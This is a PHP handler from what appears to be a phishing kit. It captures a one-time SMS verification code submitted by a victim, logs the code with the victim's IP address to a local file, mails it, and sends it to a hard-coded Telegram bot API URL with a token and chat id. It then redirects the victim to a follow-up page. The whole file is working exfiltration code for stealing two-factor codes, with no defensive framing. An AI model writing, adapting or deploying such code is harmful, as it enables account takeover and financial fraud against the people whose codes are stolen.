<?php
error_reporting(0);
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['sms'])
        // and !empty($_POST['pin'])
    ) {
            $_SESSION['sms']=$_POST['sms'];
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $Ak47  = "Chlada hak SMS\n";
            $Ak47 .= "--------------------\n";
            $Ak47 .= "sms: ".$_SESSION['sms']."\n";
            $Ak47 .= "IP: ".$ip."\n";

            $file = fopen("./useragent.txt", "a+");
            fwrite($file, $Ak47);
            fclose($file);
            $to = "";
            $subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (1ST)";
            $headers = "From: Ak47.BUlLETSâ„¢<shanks@dPortgas.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $Ak47, $headers);
            file_get_contents("https://api.telegram.org/bot1226896715:AAEzvpOBp0G0E7b-9FCd-50OJMiXY1IyLhM/sendMessage?chat_id=1298082336&text=" . urlencode($Ak47)."" ); //shanks 

            
header("Location: ../sd/fi.html?codigo_id=".md5($_GET['error']));
    }
}
?>
